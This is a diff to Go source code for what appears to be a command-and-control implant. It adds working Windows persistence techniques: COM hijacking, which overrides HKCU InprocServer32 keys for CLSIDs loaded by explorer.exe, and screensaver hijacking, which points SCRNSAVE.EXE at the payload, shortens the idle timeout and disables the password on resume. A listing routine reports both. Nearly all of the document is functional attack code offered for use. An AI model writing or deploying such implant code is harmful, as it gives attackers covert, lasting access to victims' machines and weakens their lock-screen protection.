@@ -27,11 +27,13 @@ func (c *PersistCommand) Description() string {
 }
 
 type persistArgs struct {
-	Method string `json:"method"`
-	Action string `json:"action"`
-	Name   string `json:"name"`
-	Path   string `json:"path"`
-	Hive   string `json:"hive"`
+	Method  string `json:"method"`
+	Action  string `json:"action"`
+	Name    string `json:"name"`
+	Path    string `json:"path"`
+	Hive    string `json:"hive"`
+	CLSID   string `json:"clsid"`
+	Timeout string `json:"timeout"`
 }
 
 func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
@@ -62,11 +64,15 @@ func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
 		return persistRegistryRun(args)
 	case "startup-folder", "startup":
 		return persistStartupFolder(args)
+	case "com-hijack":
+		return persistCOMHijack(args)
+	case "screensaver":
+		return persistScreensaver(args)
 	case "list":
 		return listPersistence(args)
 	default:
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown method: %s. Use: registry, startup-folder, or list", args.Method),
+			Output:    fmt.Sprintf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, or list", args.Method),
 			Status:    "error",
 			Completed: true,
 		}
@@ -331,11 +337,266 @@ func listPersistence(args persistArgs) structs.CommandResult {
 			lines = append(lines, fmt.Sprintf("  %s (%d bytes)", e.Name(), size))
 		}
 	}
+	lines = append(lines, "")
+
+	// Check COM Hijacking (known CLSIDs)
+	lines = append(lines, "--- COM Hijacking (HKCU InprocServer32 overrides) ---")
+	knownCLSIDs := [][2]string{
+		{"{42aedc87-2188-41fd-b9a3-0c966feabec1}", "MruPidlList (explorer.exe)"},
+		{"{BCDE0395-E52F-467C-8E3D-C4579291692E}", "MMDeviceEnumerator (audio apps)"},
+		{"{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}", "CAccPropServicesClass (accessibility)"},
+		{"{fbeb8a05-beee-4442-804e-409d6c4515e9}", "ShellFolderViewOC (explorer.exe)"},
+	}
+	comFound := false
+	for _, clsidInfo := range knownCLSIDs {
+		keyPath := fmt.Sprintf(`Software\Classes\CLSID\%s\InprocServer32`, clsidInfo[0])
+		key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.QUERY_VALUE)
+		if err == nil {
+			val, _, err := key.GetStringValue("")
+			key.Close()
+			if err == nil {
+				lines = append(lines, fmt.Sprintf("  %s  %s = %s", clsidInfo[0], clsidInfo[1], val))
+				comFound = true
+			}
+		}
+	}
+	if !comFound {
+		lines = append(lines, "  (none detected)")
+	}
+	lines = append(lines, "")
+
+	// Check Screensaver hijacking
+	lines = append(lines, "--- Screensaver (HKCU\\Control Panel\\Desktop) ---")
+	desktopKey, err := registry.OpenKey(registry.CURRENT_USER, `Control Panel\Desktop`, registry.QUERY_VALUE)
+	if err != nil {
+		lines = append(lines, fmt.Sprintf("  Error: %v", err))
+	} else {
+		scrnsave, _, scrErr := desktopKey.GetStringValue("SCRNSAVE.EXE")
+		active, _, actErr := desktopKey.GetStringValue("ScreenSaveActive")
+		timeout, _, _ := desktopKey.GetStringValue("ScreenSaveTimeout")
+		desktopKey.Close()
+		if scrErr == nil && scrnsave != "" {
+			activeStr := "Unknown"
+			if actErr == nil {
+				if active == "1" {
+					activeStr = "Yes"
+				} else {
+					activeStr = "No"
+				}
+			}
+			lines = append(lines, fmt.Sprintf("  SCRNSAVE.EXE    = %s", scrnsave))
+			lines = append(lines, fmt.Sprintf("  ScreenSaveActive = %s (%s)", active, activeStr))
+			if timeout != "" {
+				lines = append(lines, fmt.Sprintf("  ScreenSaveTimeout = %s seconds", timeout))
+			}
+		} else {
+			lines = append(lines, "  (no screensaver configured)")
+		}
+	}
 
 	return structs.CommandResult{
 		Output:    strings.Join(lines, "\n"),
 		Status:    "success",
 		Completed: true,
+	}
+}
+
+// defaultCLSID is MruPidlList — loaded by explorer.exe at shell startup, highly reliable.
+const defaultCLSID = "{42aedc87-2188-41fd-b9a3-0c966feabec1}"
+
+// persistCOMHijack installs/removes COM hijacking persistence via HKCU InprocServer32 override
+func persistCOMHijack(args persistArgs) structs.CommandResult {
+	if args.Path == "" && args.Action == "install" {
+		exe, err := os.Executable()
+		if err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error getting executable path: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		args.Path = exe
+	}
+
+	clsid := args.CLSID
+	if clsid == "" {
+		clsid = defaultCLSID
+	}
+	// Normalize CLSID — ensure it has braces
+	if !strings.HasPrefix(clsid, "{") {
+		clsid = "{" + clsid + "}"
+	}
+
+	keyPath := fmt.Sprintf(`Software\Classes\CLSID\%s\InprocServer32`, clsid)
+
+	switch strings.ToLower(args.Action) {
+	case "install":
+		key, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE)
+		if err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error creating HKCU\\%s: %v", keyPath, err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		defer key.Close()
+
+		// Set (Default) value to our DLL/EXE path
+		if err := key.SetStringValue("", args.Path); err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error setting DLL path: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+
+		// Set ThreadingModel (required for InprocServer32 to be used)
+		if err := key.SetStringValue("ThreadingModel", "Both"); err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error setting ThreadingModel: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Installed COM hijack persistence:\n  CLSID:          %s\n  Key:            HKCU\\%s\n  DLL/EXE:        %s\n  ThreadingModel: Both\n  Trigger:        Loaded by explorer.exe at user logon", clsid, keyPath, args.Path),
+			Status:    "success",
+			Completed: true,
+		}
+
+	case "remove":
+		// Delete InprocServer32 key first, then the CLSID key
+		if err := registry.DeleteKey(registry.CURRENT_USER, keyPath); err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error removing InprocServer32 key: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+
+		parentPath := fmt.Sprintf(`Software\Classes\CLSID\%s`, clsid)
+		// Best-effort cleanup of the parent CLSID key (may fail if it has other subkeys)
+		_ = registry.DeleteKey(registry.CURRENT_USER, parentPath)
+
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Removed COM hijack persistence:\n  CLSID: %s\n  Key:   HKCU\\%s", clsid, keyPath),
+			Status:    "success",
+			Completed: true,
+		}
+
+	default:
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error: unknown action '%s'. Use: install or remove", args.Action),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+}
+
+// persistScreensaver installs/removes screensaver hijacking persistence
+func persistScreensaver(args persistArgs) structs.CommandResult {
+	desktopKeyPath := `Control Panel\Desktop`
+
+	switch strings.ToLower(args.Action) {
+	case "install":
+		if args.Path == "" {
+			exe, err := os.Executable()
+			if err != nil {
+				return structs.CommandResult{
+					Output:    fmt.Sprintf("Error getting executable path: %v", err),
+					Status:    "error",
+					Completed: true,
+				}
+			}
+			args.Path = exe
+		}
+
+		timeout := args.Timeout
+		if timeout == "" {
+			timeout = "60" // 60 seconds idle before screensaver triggers
+		}
+
+		key, err := registry.OpenKey(registry.CURRENT_USER, desktopKeyPath, registry.SET_VALUE)
+		if err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error opening HKCU\\%s: %v", desktopKeyPath, err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		defer key.Close()
+
+		// Set SCRNSAVE.EXE to our payload
+		if err := key.SetStringValue("SCRNSAVE.EXE", args.Path); err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error setting SCRNSAVE.EXE: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+
+		// Enable screensaver
+		if err := key.SetStringValue("ScreenSaveActive", "1"); err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error setting ScreenSaveActive: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+
+		// Set idle timeout
+		if err := key.SetStringValue("ScreenSaveTimeout", timeout); err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error setting ScreenSaveTimeout: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+
+		// Disable password on resume (avoids locking user out)
+		if err := key.SetStringValue("ScreenSaverIsSecure", "0"); err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error setting ScreenSaverIsSecure: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Installed screensaver persistence:\n  Key:      HKCU\\%s\n  Payload:  %s\n  Timeout:  %s seconds\n  Secure:   No (no password on resume)\n  Trigger:  User idle for %s seconds → winlogon.exe launches payload", desktopKeyPath, args.Path, timeout, timeout),
+			Status:    "success",
+			Completed: true,
+		}
+
+	case "remove":
+		key, err := registry.OpenKey(registry.CURRENT_USER, desktopKeyPath, registry.SET_VALUE)
+		if err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error opening HKCU\\%s: %v", desktopKeyPath, err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		defer key.Close()
+
+		// Remove the screensaver executable
+		_ = key.DeleteValue("SCRNSAVE.EXE")
+		// Disable screensaver
+		_ = key.SetStringValue("ScreenSaveActive", "0")
+
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Removed screensaver persistence:\n  Deleted SCRNSAVE.EXE value\n  Disabled screensaver (ScreenSaveActive = 0)"),
+			Status:    "success",
+			Completed: true,
+		}
+
+	default:
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error: unknown action '%s'. Use: install or remove", args.Action),
+			Status:    "error",
+			Completed: true,
+		}
 	}
 }
 
